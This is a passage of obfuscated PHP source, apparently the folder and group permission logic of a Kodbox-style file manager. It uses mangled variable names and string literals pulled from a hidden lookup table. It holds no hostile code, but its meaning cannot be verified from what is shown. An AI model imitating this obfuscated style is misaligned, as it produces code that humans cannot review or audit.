$this->sourceAuthSelect($ØÂ¼½¾); $„‘áª = array(); $„î¿²·ñ = array(); foreach ($„à—ğš” as $‚¨ÉÌÀ) { unset($‚¨ÉÌÀ[$Ã¬åšª¢[532]]); unset($‚¨ÉÌÀ[$Ã¬åšª¢[530]]); unset($‚¨ÉÌÀ[$Ã¬åšª¢[490]]); unset($‚¨ÉÌÀ[$Ã¬åšª¢[90]]); $³­íäÙÑ = $ ¢º¨´Ë[$‚¨ÉÌÀ[$Ã¬åšª¢[194]]]; if (!$³­íäÙÑ) { continue; } $‚¨ÉÌÀ[$Ã¬åšª¢[2183]] = $this->authTargetInfo($³­íäÙÑ); $‚¨ÉÌÀ[$Ã¬åšª¢[587]] = rtrim($‚¨ÉÌÀ[$Ã¬åšª¢[593]], $Ã¬åšª¢[8]) . $Ã¬åšª¢[8] . ltrim($‚¨ÉÌÀ[$Ã¬åšª¢[587]], $Ã¬åšª¢[8]); $„‘áª[] = $‚¨ÉÌÀ; $ìº¾úÆ = count(explode($Ã¬åšª¢[8], trim($‚¨ÉÌÀ[$Ã¬åšª¢[587]], $Ã¬åšª¢[8]))); $„î¿²·ñ[] = $ìº¾úÆ + ($‚¨ÉÌÀ[$Ã¬åšª¢[33]] == $Ã¬åšª¢[78] ? 0 : 1000); } array_multisort($„î¿²·ñ, SORT_ASC, $„‘áª); return $„‘áª; } private function groupChidldAllRootSource($¨¦¬½ñò) { $§’ŞäÜµ =& $_SERVER[¼¥ÊĞÙÌ]; $ù¤ï£­ = Model($§’ŞäÜµ[1400])->groupChildrenAll($¨¦¬½ñò); $Ëï¶œš = array($§’ŞäÜµ[193] => 0, $§’ŞäÜµ[574] => array($§’ŞäÜµ[7], $ù¤ï£­), $§’ŞäÜµ[191] => SourceModel::TYPE_GROUP); $øº”Ê‰ = Model($§’ŞäÜµ[904])->field($§’ŞäÜµ[194])->where($Ëï¶œš)->select(); $øº”Ê‰ = array_to_keyvalue($øº”Ê‰, $§’ŞäÜµ[12], $§’ŞäÜµ[194]); return $øº”Ê‰; } private function authTargetInfo($ü„šµÇ—) { $Ğ°çìˆ =& $_SERVER[¼¥ÊĞÙÌ]; $Á­Ã½­ = array(); $¶ûã•ëĞ = array(); $çñ¥ÍïÑ = 2 << 25; foreach ($ü„šµÇ— as $ÃüßàíÈ) { $ãåÊÖƒö = Model($Ğ°çìˆ[576])->listData($ÃüßàíÈ[$Ğ°çìˆ[2100]]); if (!$ãåÊÖƒö) { continue; } if ($ÃüßàíÈ[$Ğ°çìˆ[191]] == SourceModel::TYPE_USER) { $ŒäÒë¤ = Model($Ğ°çìˆ[582])->getInfoSimpleOuter($ÃüßàíÈ[$Ğ°çìˆ[574]]); if ($ŒäÒë¤[$Ğ°çìˆ[1790]] == $Ğ°çìˆ[1285]) { continue; } if ($ŒäÒë¤[$Ğ°çìˆ[1790]] == $Ğ°çìˆ[231]) { $ŒäÒë¤[$Ğ°çìˆ[32]] = LNG($Ğ°çìˆ[2184]); } } else { $ŒäÒë¤ = Model($Ğ°çìˆ[590])->getInfoSimple($ÃüßàíÈ[$Ğ°çìˆ[574]]); } if (!$ŒäÒë¤) { continue; } $ŒäÒë¤[$Ğ°çìˆ[545]] = $ãåÊÖƒö; $Á­Ã½­[] = $ŒäÒë¤; $æïçû…Â = 0; if ($ÃüßàíÈ[$Ğ°çìˆ[191]] == SourceModel::TYPE_GROUP) { $æïçû…Â = $çñ¥ÍïÑ * 2; } if ($ÃüßàíÈ[$Ğ°çìˆ[191]] == SourceModel::TYPE_USER) { $æïçû…Â = $çñ¥ÍïÑ; } if ($ÃüßàíÈ[$Ğ°çìˆ[191]] == SourceModel::TYPE_USER && $ÃüßàíÈ[$Ğ°çìˆ[574]] == $Ğ°çìˆ[231]) { $æïçû…Â = 0; } $¶ûã•ëĞ[] = $ãåÊÖƒö[$Ğ°çìˆ[490]] + $æïçû…Â; } array_multisort($¶ûã•ëĞ, SORT_DESC, $Á­Ã½­); return $Á­Ã½­; } public function getAllChildrenByUser($÷Ï¬Ş×«, $¤Õ«Û¿ñ) { $«ºÉ‹‘™ =& $_SERVER[¼¥ÊĞÙÌ]; $­§ÍÇ’Ö = Model($«ºÉ‹‘™[602])->getInfo($¤Õ«Û¿ñ); if (!$¤Õ«Û¿ñ || !$÷Ï¬Ş×« || !$­§ÍÇ’Ö) { return array(); } $ğ‚Œ¾á­ = Model($«ºÉ‹‘™[1440])->sourceInfo($÷Ï¬Ş×«); $âƒÓ†¬‹ = array(); $àÏâ¨¾Ş = 1; if ($ğ‚Œ¾á­[$«ºÉ‹‘™[193]] == $«ºÉ‹‘™[231] && $ğ‚Œ¾á­[$«ºÉ‹‘™[574]] != $àÏâ¨¾Ş && $this->groupContainUser($ğ‚Œ¾á­[$«ºÉ‹‘™[574]], $¤Õ«Û¿ñ)) { foreach ($­§ÍÇ’Ö[$«ºÉ‹‘™[1401]] as $ó©‡ÕáÆ) { $¹¶Ô¡ = Model($«ºÉ‹‘™[590])->getInfo($ó©‡ÕáÆ[$«ºÉ‹‘™[1402]]); $„´“Ü‰ˆ = Model($«ºÉ‹‘™[602])->getInfoSimpleOuter($¤Õ«Û¿ñ); $„´“Ü‰ˆ[$«ºÉ‹‘™[545]] = $ó©‡ÕáÆ[$«ºÉ‹‘™[490]]; if (Model($«ºÉ‹‘™[576])->authCheckAction($ó©‡ÕáÆ[$«ºÉ‹‘™[490]][$«ºÉ‹‘™[490]], $«ºÉ‹‘™[2012])) { continue; } $Í¸‡é°í = array($«ºÉ‹‘™[32] => $«ºÉ‹‘™[1305] . $¹¶Ô¡[$«ºÉ‹‘™[32]], $«ºÉ‹‘™[194] => $¹¶Ô¡[$«ºÉ‹‘™[90]][$«ºÉ‹‘™[194]], $«ºÉ‹‘™[87] => KodIO::make($¹¶Ô¡[$«ºÉ‹‘™[90]][$«ºÉ‹‘™[194]]), $«ºÉ‹‘™[193] => $«ºÉ‹‘™[231], $«ºÉ‹‘™[191] => $«ºÉ‹‘™[583], $«ºÉ‹‘™[33] => $«ºÉ‹‘™[624], $«ºÉ‹‘™[587] => $¹¶Ô¡[$«ºÉ‹‘™[594]], $«ºÉ‹‘™[1402] => $¹¶Ô¡[$«ºÉ‹‘™[1402]], $«ºÉ‹‘™[591] => $¹¶Ô¡[$«ºÉ‹‘™[193]], $«ºÉ‹‘™[2183] => array($„´“Ü‰ˆ)); $âƒÓ†¬‹[$Í¸‡é°í[$«ºÉ‹‘™[194]]] = $Í¸‡é°í; } } $øôÜÈñÛ = array(); $Ê²Ë½Ä¯ = $this->getAllChildren($÷Ï¬Ş×«); foreach ($Ê²Ë½Ä¯ as $ŒÔ¨¢) { $ŞÔõ¸ñŞ = !1; foreach ($ŒÔ¨¢[$«ºÉ‹‘™[2183]] as $ÛÆ†¦çÇ) { if ($ÛÆ†¦çÇ[$«ºÉ‹‘™[1790]]) { if ($ÛÆ†¦çÇ[$«ºÉ‹‘™[1790]] == $¤Õ«Û¿ñ) { $ŞÔõ¸ñŞ = !0; break; } } if ($ÛÆ†¦çÇ[$«ºÉ‹‘™[1402]]) { if ($this->groupContainUser($ÛÆ†¦çÇ[$«ºÉ‹‘™[1402]], $¤Õ«Û¿ñ)) { $ŞÔõ¸ñŞ = !0; break; } } } if ($ŞÔõ¸ñŞ) { $øôÜÈñÛ[] = $ŒÔ¨¢; } $£õŠ¯€ø = $ŒÔ¨¢[$«ºÉ‹‘™[194]]; if (isset($âƒÓ†¬‹[$£õŠ¯€ø])) { $ŒÔ¨¢[$«ºÉ‹‘™[2183]][] = $âƒÓ†¬‹[$£õŠ¯€ø][0]; $âƒÓ†¬‹[$£õŠ¯€ø] = !1; } } $âƒÓ†¬‹ = array_filter(array_values($âƒÓ†¬‹)); $øôÜÈñÛ = array_merge($âƒÓ†¬‹, $øôÜÈñÛ); return $øôÜÈñÛ; } public function setAllChildrenByUser($ì—ªÕ¿³, $äø‚è¢à, $®Ğ†—Íİ) { $Ç³Ôó‹¦ =& $_SERVER[¼¥ÊĞÙÌ]; $¯òŠ’ª‚ = $this->getAllChildrenByUser($ì—ªÕ¿³, $äø‚è¢à); if (!$®Ğ†—Íİ || !$¯òŠ’ª‚) { return !1; } foreach ($¯òŠ’ª‚ as $‡êòâÉË) { $ê±Ù‡Õş = array(); foreach ($‡êòâÉË[$Ç³Ôó‹¦[2183]] as $¤ßŸ–ô«) { $‚»…å = $¤ßŸ–ô«[$Ç³Ôó‹¦[545]]; $¾—šÌÏÅ = $¤ßŸ–ô«[$Ç³Ôó‹¦[1790]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $µ¾×Â = $¤ßŸ–ô«[$Ç³Ôó‹¦[1790]] ? $¤ßŸ–ô«[$Ç³Ôó‹¦[1790]] : $¤ßŸ–ô«[$Ç³Ôó‹¦[1402]]; if ($¤ßŸ–ô«[$Ç³Ôó‹¦[1790]] && $¤ßŸ–ô«[$Ç³Ôó‹¦[1790]] == $äø‚è¢à) { continue; } $ê±Ù‡Õş[] = array($Ç³Ôó‹¦[194] => $‡êòâÉË[$Ç³Ôó‹¦[194]], $Ç³Ôó‹¦[191] => $¾—šÌÏÅ, $Ç³Ôó‹¦[574] => intval($µ¾×Â), $Ç³Ôó‹¦[2100] => isset($‚»…å[$Ç³Ôó‹¦[478]]) ? intval($‚»…å[$Ç³Ôó‹¦[478]]) : 0, $Ç³Ôó‹¦[2163] => isset($‚»…å[$Ç³Ôó‹¦[2163]]) ? intval($‚»…å[$Ç³Ôó‹¦[2163]]) : -1); } $ê±Ù‡Õş[] = array($Ç³Ôó‹¦[194] => $‡êòâÉË[$Ç³Ôó‹¦[194]], $Ç³Ôó‹¦[191] => SourceModel::TYPE_USER, $Ç³Ôó‹¦[574] => intval($äø‚è¢à), $Ç³Ôó‹¦[2100] => intval($®Ğ†—Íİ), $Ç³Ôó‹¦[2163] => -1); $this->where(array($Ç³Ôó‹¦[494] => $‡êòâÉË[$Ç³Ôó‹¦[194]]))->delete(); $this->addAll($ê±Ù‡Õş); } return !0; } public function get($öö·¶«Ì) { $§ç’ù¥Ã = $this->getSourceList(array($öö·¶«Ì), !0); return $§ç’ù¥Ã[0]; } public function getSourceList($¤µ¹ı , $ûíğ±Ş = false, $Ã¹ÂÈ«« = false) { $ÖòåÛóª =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¤µ¹ı ) { return array(); } $ÆÄ¿Ñƒ£ = Model($ÖòåÛóª[1440]); if (!$ûíğ±Ş && count($¤µ¹ı ) == 1) { $ûíğ±Ş = array(); $ûíğ±Ş[$¤µ¹ı [0]] = $ÆÄ¿Ñƒ£->sourceInfo($¤µ¹ı [0]); } if (!$ûíğ±Ş) { $¢ô°ëÚ¿ = array($ÖòåÛóª[494] => array($ÖòåÛóª[495], $¤µ¹ı )); $ûíğ±Ş = $ÆÄ¿Ñƒ£->field($ÖòåÛóª[2185])->where($¢ô°ëÚ¿)->select(); $ûíğ±Ş = array_to_keyvalue($ûíğ±Ş, $ÖòåÛóª[194]); } $£ÈŸøàä = $¤µ¹ı ; foreach ($ûíğ±Ş as $ãûË¤›± => $ø¯ØŠÌì) { $±Œˆ«ØÈ = $ÆÄ¿Ñƒ£->parentLevelArray($ø¯ØŠÌì[$ÖòåÛóª[589]]); $£ÈŸøàä = array_merge($£ÈŸøàä, array($ãûË¤›±), array_reverse($±Œˆ«ØÈ)); } $£ÈŸøàä = array_values(array_unique($£ÈŸøàä)); if (!$£ÈŸøàä) { return array(); } $©¾–¯Ì· = $this->sourceAuthSelect($£ÈŸøàä); $ò¸½ûšÊ = array(); foreach ($£ÈŸøàä as $†ƒœ·Êœ) { if (isset($©¾–¯Ì·[$†ƒœ·Êœ])) { $ò¸½ûšÊ[$†ƒœ·Êœ] = $©¾–¯Ì·[$†ƒœ·Êœ]; } } $ò¸»Å = $this->userIsRoot($Ã¹ÂÈ««); $˜îÏˆİ’ = AuthModel::authAll(); $çÉ‰¯ıÄ = array($ÖòåÛóª[491] => $˜îÏˆİ’, $ÖòåÛóª[2186] => array($ÖòåÛóª[496] => 0, $ÖòåÛóª[1997] => $˜îÏˆİ’, $ÖòåÛóª[497] => LNG($ÖòåÛóª[2187]), $ÖòåÛóª[2014] => $ÖòåÛóª[2188])); $÷¡¿çÚğ = array(); foreach ($ûíğ±Ş as $†ƒœ·Êœ => $öó í¢) { if ($ò¸»Å && $GLOBALS[$ÖòåÛóª[6]][$ÖòåÛóª[2010]]) { $÷¡¿çÚğ[$†ƒœ·Êœ] = $çÉ‰¯ıÄ; continue; } $÷¡¿çÚğ[$†ƒœ·Êœ] = $this->makeSourceAuth($öó í¢, $ò¸½ûšÊ, $Ã¹ÂÈ««); } return $÷¡¿çÚğ; } public function authDeepCheck($ì•—µ©¸, $½“ø–… = false) { $½ÓÆŸİ =& $_SERVER[¼¥ÊĞÙÌ]; $½“ø–… = $½“ø–… ? $½“ø–… : USER_ID; $±¸ØĞ‡³ = $this->makeAuthDeep($½“ø–…); if (!in_array($ì•—µ©¸, $±¸ØĞ‡³[$½ÓÆŸİ[2189]])) { return !1; } $©Õ±¥Û­ = array(); foreach ($±¸ØĞ‡³[$½ÓÆŸİ[2190]] as $½ òœœÀ => $íÜù¦îş) { if (!in_array($ì•—µ©¸, $íÜù¦îş)) { continue; } $©Õ±¥Û­[] = $½ òœœÀ; } if (!$©Õ±¥Û­) { return !1; } $°„‘™Ûê = $©Õ±¥Û­ ? $©Õ±¥Û­[0] : $ì•—µ©¸; return array($½ÓÆŸİ[491] => -1, $½ÓÆŸİ[545] => array($½ÓÆŸİ[496] => $½ÓÆŸİ[1285], $½ÓÆŸİ[1997] => $½ÓÆŸİ[231], $½ÓÆŸİ[497] => LNG($½ÓÆŸİ[2191]), $½ÓÆŸİ[2014] => $½ÓÆŸİ[2192]), $½ÓÆŸİ[2193] => LNG($½ÓÆŸİ[2194]), $½ÓÆŸİ[2195] => $this->sourceAuthInfo($°„‘™Ûê)); } protected function makeAuthDeep($¨İé±›ü = false) { $Í·¼¤êö =& $_SERVER[¼¥ÊĞÙÌ]; static $›ãŸ’±í = array(); $¨İé±›ü = $¨İé±›ü ? $¨İé±›ü : USER_ID; if (isset($›ãŸ’±í[$¨İé±›ü])) { return $›ãŸ’±í[$¨İé±›ü]; } $ööµ¨”¾ = Model($Í·¼¤êö[2196])->listData(); $ƒ·¼Ç = array(); foreach ($ööµ¨”¾ as $şõ×´—) { if ($şõ×´—[$Í·¼¤êö[490]] == 0 && $şõ×´—[$Í·¼¤êö[2013]] == $Í·¼¤êö[91]) { $ƒ·¼Ç[] = $şõ×´—[$Í·¼¤êö[478]]; } } $Úùâ‡£µ = $this->userGroupParents($¨İé±›ü); $Û¦•´Ä° = array($Í·¼¤êö[191] => SourceModel::TYPE_USER, $Í·¼¤êö[574] => $¨İé±›ü); if ($Úùâ‡£µ) { $Û¦•´Ä° = array(array($Í·¼¤êö[191] => SourceModel::TYPE_USER, $Í·¼¤êö[574] => $¨İé±›ü), array($Í·¼¤êö[191] => SourceModel::TYPE_GROUP, $Í·¼¤êö[574] => array($Í·¼¤êö[495], $Úùâ‡£µ)), $Í·¼¤êö[1086] => $Í·¼¤êö[2094]); } $ı‰óëƒì = $this->field($Í·¼¤êö[2197])->where($Û¦•´Ä°)->select(); $ì³›ÈŸ¢ = array(); $Ç¨íŠŸÎ = array_to_keyvalue_group($ı‰óëƒì, $Í·¼¤êö[194]); foreach ($Ç¨íŠŸÎ as $´ÅÃ“®¯ => $ü«ÕºÓ) { $ê›ÖöàÀ = $this->authArrayCheck($ü«ÕºÓ, $¨İé±›ü); if ($ê›ÖöàÀ[$Í·¼¤êö[491]] > 0) { $ì³›ÈŸ¢[] = $´ÅÃ“®¯ . $Í·¼¤êö[12]; } } if ($Úùâ‡£µ) { $ã²½·áÍ = Model($Í·¼¤êö[590]); foreach ($Úùâ‡£µ as $¹ø€’Í) { $ÜÔÓÏ¦æ = $ã²½·áÍ->getInfo($¹ø€’Í); if (!$ÜÔÓÏ¦æ || !is_array($ÜÔÓÏ¦æ[$Í·¼¤êö[90]])) { continue; } $ì³›ÈŸ¢[] = $ÜÔÓÏ¦æ[$Í·¼¤êö[90]][$Í·¼¤êö[194]]; } } $ãÇùú = array(); $Â§§ô°Û = $Úùâ‡£µ; $Àã¡ôåÒ = Model($Í·¼¤êö[1440]); $ã²½·áÍ = Model($Í·¼¤êö[590]); $à—µñÉÁ = array(); $Ã´ñ”ÕË = array(); $„àÈ¢Ø = array(); $¶­ƒÇ¸ = array(); if ($ì³›ÈŸ¢) { $êı§†Öû = $Àã¡ôåÒ->where(array($Í·¼¤êö[194] => array($Í·¼¤êö[495], $ì³›ÈŸ¢)))->select(); foreach ($êı§†Öû as $¿š½ÇŠÂ) { if ($¿š½ÇŠÂ[$Í·¼¤êö[508]] == $Í·¼¤êö[91]) { continue; } $®Ö ¤¬ = $Àã¡ôåÒ->parentLevelArray($¿š½ÇŠÂ[$Í·¼¤êö[589]]); $ãÇùú = array_merge($ãÇùú, $®Ö ¤¬); $Â§§ô°Û[] = $¿š½ÇŠÂ[$Í·¼¤êö[574]]; $à—µñÉÁ[$¿š½ÇŠÂ[$Í·¼¤êö[194]]] = $®Ö ¤¬; $Ã´ñ”ÕË[$¿š½ÇŠÂ[$Í·¼¤êö[194]]] = $¿š½ÇŠÂ[$Í·¼¤êö[574]]; } } $Â§§ô°Û = array_values(array_unique($Â§§ô°Û)); $™ÕˆÁ‚¼ = $Â§§ô°Û; foreach ($™ÕˆÁ‚¼ as $¹ø€’Í) { $ÜÔÓÏ¦æ = $ã²½·áÍ->getInfo($¹ø€’Í); $®Ö ¤¬ = $Àã¡ôåÒ->parentLevelArray($ÜÔÓÏ¦æ[$Í·¼¤êö[589]]); $Â§§ô°Û = array_merge($Â§§ô°Û, $®Ö ¤¬); } $Â§§ô°Û = array_values(array_unique($Â§§ô°Û)); foreach ($Â§§ô°Û as $¹ø€’Í) { $ÜÔÓÏ¦æ = $ã²½·áÍ->getInfo($¹ø€’Í); $ãÇùú[] = $ÜÔÓÏ¦æ[$Í·¼¤êö[90]][$Í·¼¤êö[194]]; $„àÈ¢Ø[$¹ø€’Í] = $ÜÔÓÏ¦æ[$Í·¼¤êö[90]][$Í·¼¤êö[194]]; $¶­ƒÇ¸[$¹ø€’Í] = $Àã¡ôåÒ->parentLevelArray($ÜÔÓÏ¦æ[$Í·¼¤êö[589]]); } foreach ($à—µñÉÁ as $üƒïìË‰ => $œÈÒì¯ú) { $™İÀÒàş = $Ã´ñ”ÕË[$üƒïìË‰]; if (!$™İÀÒàş || !$„àÈ¢Ø[$™İÀÒàş]) { continue; } $ùÖÇï­ = array(); foreach ($¶­ƒÇ¸[$™İÀÒàş] as $¹ø€’Í) { $ùÖÇï­[] = $„àÈ¢Ø[$¹ø€’Í]; } $à—µñÉÁ[$üƒïìË‰] = array_merge($ùÖÇï­, $œÈÒì¯ú); } $ãÇùú = array_values(array_unique($ãÇùú)); $ÉÅıìé = array($Í·¼¤êö[2189] => $ãÇùú, $Í·¼¤êö[2190] => $à—µñÉÁ); $›ãŸ’±í[$¨İé±›ü] = $ÉÅıìé; return $ÉÅıìé; } private function makeSourceAuth($Íäó®³Ğ, $ìÑíùÃ±, $ÆË½ñƒ’ = false) { $¡¸¡ò¢‹ =& $_SERVER[¼¥ÊĞÙÌ]; $Í¾Ä•™« = $¡¸¡ò¢‹[91]; $£âšÈÈú = $Íäó®³Ğ[$¡¸¡ò¢‹[574]]; $åÏıÌéĞ = $Íäó®³Ğ[$¡¸¡ò¢‹[191]] == SourceModel::TYPE_GROUP; $ŒŒú¡Üƒ = $åÏıÌéĞ ? $this->groupRootAuth($£âšÈÈú, $ÆË½ñƒ’) : !1; if ($ŒŒú¡Üƒ && Model($¡¸¡ò¢‹[576])->authCheckAction($ŒŒú¡Üƒ[$¡¸¡ò¢‹[490]], $¡¸¡ò¢‹[2012])) { return $this->groupAuthInfo($ŒŒú¡Üƒ, $£âšÈÈú); } $¦ïÓİ¢ˆ = Model($¡¸¡ò¢‹[1440])->parentLevelArray($Íäó®³Ğ[$¡¸¡ò¢‹[589]]); $¦ïÓİ¢ˆ = array_merge(array($Íäó®³Ğ[$¡¸¡ò¢‹[194]]), array_reverse($¦ïÓİ¢ˆ)); $É €¥¼è = !1; foreach ($¦ïÓİ¢ˆ as $Ì­éé…ù) { if (!isset($ìÑíùÃ±[$Ì­éé…ù])) { continue; } $Ÿ£óÁÊ¹ = $this->authMake($ìÑíùÃ±[$Ì­éé…ù], $ÆË½ñƒ’); if ($Ÿ£óÁÊ¹[$¡¸¡ò¢‹[545]]) { $É €¥¼è = $Ÿ£óÁÊ¹; break; } } if (!$åÏıÌéĞ) { return $É €¥¼è; } if (!$É €¥¼è && $ŒŒú¡Üƒ) { $É €¥¼è = $this->groupAuthInfo($ŒŒú¡Üƒ, $£âšÈÈú); } if (!$É €¥¼è) { $¡¾­°ßá = Model($¡¸¡ò¢‹[590])->getInfo($£âšÈÈú); $ì·éÎ¤ = explode($¡¸¡ò¢‹[50], trim($¡¾­°ßá[$¡¸¡ò¢‹[589]], $¡¸¡ò¢‹[50])); $ì·éÎ¤ = array_reverse($ì·éÎ¤); foreach ($ì·éÎ¤ as $ÖÜ¬´ù) { if ($ÖÜ¬´ù == $¡¸¡ò¢‹[231] || $ÖÜ¬´ù == $Í¾Ä•™«) { continue; } $ÉŠÏ·üÃ = $this->groupRootAuth($ÖÜ¬´ù, $ÆË½ñƒ’); if (!$ÉŠÏ·üÃ) { continue; } $É €¥¼è = $this->groupAuthInfo($ÉŠÏ·üÃ, $ÖÜ¬´ù); break; } } if (!$É €¥¼è || $É €¥¼è[$¡¸¡ò¢‹[491]] <= 0) { $¦í¥îãÅ = $this->authDeepCheck($Íäó®³Ğ[$¡¸¡ò¢‹[194]], $ÆË½ñƒ’); if ($¦í¥îãÅ) { $É €¥¼è = $¦í¥îãÅ; } } return $É €¥¼è; } private function userIsRoot($Â—‡ûÆº = false) { $…¿®üš =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Â—‡ûÆº && KodUser::isRoot()) { return !0; } $¥îÁŸõ = Model($…¿®üš[602])->getInfo($Â—‡ûÆº); $­ÈÃÖï = Model($…¿®üš[2198])->listData($¥îÁŸõ[$…¿®üš[2199]]); if ($­ÈÃÖï && $­ÈÃÖï[$…¿®üš[580]][$…¿®üš[2200]] == 1) { return !0; } return !1; } private function sourceAuthInfo($½›†Ò æ) { $¨÷»˜æõ =& $_SERVER[¼¥ÊĞÙÌ]; $áãŸ€ı× = Model($¨÷»˜æõ[1440]); $Ô¾îÕ¿à = $áãŸ€ı×->sourceInfo($½›†Ò æ); if (!$Ô¾îÕ¿à) { return !1; } $áãŸ€ı×->groupPathDisplay($Ô¾îÕ¿à); $ƒæÎÍ›© = array($Ô¾îÕ¿à); $ƒæÎÍ›© = $áãŸ€ı×->_listAppendPath($ƒæÎÍ›©); $Ô¾îÕ¿à = $ƒæÎÍ›©[0]; $úëÅá’Ë = $Ô¾îÕ¿à[$¨÷»˜æõ[587]]; if (isset($Ô¾îÕ¿à[$¨÷»˜æõ[595]])) { $¡İœ´ÂÆ = explode($¨÷»˜æõ[8], trim($Ô¾îÕ¿à[$¨÷»˜æõ[587]], $¨÷»˜æõ[8])); array_shift($¡İœ´ÂÆ); $úëÅá’Ë = $Ô¾îÕ¿à[$¨÷»˜æõ[593]] . $¨÷»˜æõ[2201] . implode($¨÷»˜æõ[8], $¡İœ´ÂÆ); } return array($¨÷»˜æõ[497] => $Ô¾îÕ¿à[$¨÷»˜æõ[32]], $¨÷»˜æõ[87] => KodIO::make($Ô¾îÕ¿à[$¨÷»˜æõ[194]]), $¨÷»˜æõ[2202] => $úëÅá’Ë); } private function groupAuthInfo($‹‡äÚö, $‹†œ¬¶Õ) { $õß‡Šê‡ =& $_SERVER[¼¥ÊĞÙÌ]; $ı¸³Í—ì = Model($õß‡Šê‡[590])->getInfo($‹†œ¬¶Õ); return array($õß‡Šê‡[2203] => intval($‹‡äÚö[$õß‡Šê‡[490]]), $õß‡Šê‡[2186] => $‹‡äÚö, $õß‡Šê‡[2204] => LNG($õß‡Šê‡[2205]), $õß‡Šê‡[2195] => array($õß‡Šê‡[497] => $ı¸³Í—ì[$õß‡Šê‡[32]], $õß‡Šê‡[87] => KodIO::make($ı¸³Í—ì[$õß‡Šê‡[90]][$õß‡Šê‡[194]]), $õß‡Šê‡[2202] => $ı¸³Í—ì[$õß‡Šê‡[594]])); } protected function groupRootAuth($“Ÿ£öĞò, $ø»õ«Ğ” = false) { $ğÀÛ’¢¡ =& $_SERVER[¼¥ÊĞÙÌ]; $ø»õ«Ğ” = $ø»õ«Ğ” ? $ø»õ«Ğ” : USER_ID; $¸„ì¿Ñ• = $ø»õ«Ğ” . $ğÀÛ’¢¡[2206] . $“Ÿ£öĞò; static $à…—…¤ = array(); if (isset($à…—…¤[$¸„ì¿Ñ•])) { return $à…—…¤[$¸„ì¿Ñ•]; } $ÑûØ÷ºş = Model($ğÀÛ’¢¡[590])->getInfo($“Ÿ£öĞò); $§ƒÓÃ´¶ = $this->userGroupList($ø»õ«Ğ”); $å¯åë© = isset($§ƒÓÃ´¶[$“Ÿ£öĞò]) ? $§ƒÓÃ´¶[$“Ÿ£öĞò][$ğÀÛ’¢¡[490]] : !1; if ($å¯åë© && Model($ğÀÛ’¢¡[576])->authCheckAction($å¯åë©[$ğÀÛ’¢¡[490]], $ğÀÛ’¢¡[2012])) { $à…—…¤[$¸„ì¿Ñ•] = $å¯åë©; return $å¯åë©; } $ã• æà¥ = $this->sourceAuthSelect($ÑûØ÷ºş[$ğÀÛ’¢¡[90]][$ğÀÛ’¢¡[194]]); $Î¦€Ñó = $ã• æà¥ ? $this->authMake($ã• æà¥, $ø»õ«Ğ”) : !1; $ı‹ŞÂı = $Î¦€Ñó ? $Î¦€Ñó[$ğÀÛ’¢¡[545]] : !1; $à…—…¤[$¸„ì¿Ñ•] = $ı‹ŞÂı ? $ı‹ŞÂı : $å¯åë©; return $à…—…¤[$¸„ì¿Ñ•]; } public function authOwnerApply($Ú‰Ã¯Ä¤) { $õı°Ëõ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($Ú‰Ã¯Ä¤[$õı°Ëõ[490]]) || isset($Ú‰Ã¯Ä¤[$õı°Ëõ[2207]]) && $Ú‰Ã¯Ä¤[$õı°Ëõ[2207]]) { return $Ú‰Ã¯Ä¤; } if (AuthModel::authCheckRoot($Ú‰Ã¯Ä¤[$õı°Ëõ[490]][$õı°Ëõ[491]])) { return $Ú‰Ã¯Ä¤; } $Äá„£Á = Model($õı°Ëõ[1440])->parentLevelArray($Ú‰Ã¯Ä¤[$õı°Ëõ[589]]); $Äá„£Á = array_merge(array($Ú‰Ã¯Ä¤[$õı°Ëõ[194]]), array_reverse($Äá„£Á)); $Îˆ‚÷å = $this->sourceAuthSelect($Äá„£Á); $êï”‰ã  = array(); $“Ö©èã = array(); foreach ($Îˆ‚÷å as $¯±Š“Èò => $™Ô°Æş) { $à“ñÂ•Ó = $this->authFolderOwnerUser($™Ô°Æş); $êï”‰ã [$¯±Š“Èò] = $à“ñÂ•Ó; $“Ö©èã = array_merge($“Ö©èã, $à“ñÂ•Ó[$õı°Ëõ[670]]); if ($à“ñÂ•Ó[$õı°Ëõ[2208]]) { break; } } if (count($“Ö©èã) == 0) { $“Ö©èã = $this->authFolderOwnerGroup($Ú‰Ã¯Ä¤[$õı°Ëõ[574]]); } $“Ö©èã = array_unique($“Ö©èã); if (AuthModel::authCheckRoot($Ú‰Ã¯Ä¤[$õı°Ëõ[490]][$õı°Ëõ[491]])) { $“Ö©èã[] = USER_ID; } $Ú‰Ã¯Ä¤[$õı°Ëõ[490]][$õı°Ëõ[2209]] = Model($õı°Ëõ[582])->userListInfo($“Ö©èã); return $Ú‰Ã¯Ä¤; } private function authFolderOwnerGroup($åÏ¾°™ª) { $ŞùÄÏ— =& $_SERVER[¼¥ÊĞÙÌ]; $Æ¶Ã¢¤ = Model($ŞùÄÏ—[2086])->where(array($ŞùÄÏ—[1402] => $åÏ¾°™ª))->select(); $×éşºÕİ = array(); if (!$Æ¶Ã¢¤) { return $×éşºÕİ; } foreach ($Æ¶Ã¢¤ as $­­ÑãŒ) { $îÆœú® = $this->authInfo($­­ÑãŒ); if (AuthModel::authCheckRoot($îÆœú®[$ŞùÄÏ—[490]])) { $×éşºÕİ[] = $­­ÑãŒ[$ŞùÄÏ—[1790]]; } } return $×éşºÕİ; } private function authFolderOwnerUser($¹µ³½…ã) { $è‹›¯ =& $_SERVER[¼¥ÊĞÙÌ]; $œ’£ûé‡ = array(); $ô…‹öœ‘ = !1; foreach ($¹µ³½…ã as $²¤üÙ‰) { $Æ¬³¦œ¦ = $this->authInfo($²¤üÙ‰); if ($²¤üÙ‰[$è‹›¯[574]] == $è‹›¯[231]) { $ô…‹öœ‘ = !0; } if ($²¤üÙ‰[$è‹›¯[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Æ¬³¦œ¦[$è‹›¯[490]])) { $œ’£ûé‡[] = $²¤üÙ‰[$è‹›¯[574]]; } } } return array($è‹›¯[670] => $œ’£ûé‡, $è‹›¯[2208] => $ô…‹öœ‘); } public function authMake($±‡“Ì”Ğ, $¯ˆ¼†ĞÛ = false) { $û™û ÷… =& $_SERVER[¼¥ÊĞÙÌ]; $ı˜éö = $this->authArrayCheck($±‡“Ì”Ğ, $¯ˆ¼†ĞÛ); if ($ı˜éö[$û™û ÷…[2210]]) { $ı˜éö[$û™û ÷…[2210]] = $this->sourceAuthInfo($ı˜éö[$û™û ÷…[2210]]); } return $ı˜éö; } public function authArrayCheck($—¤ì–ò•, 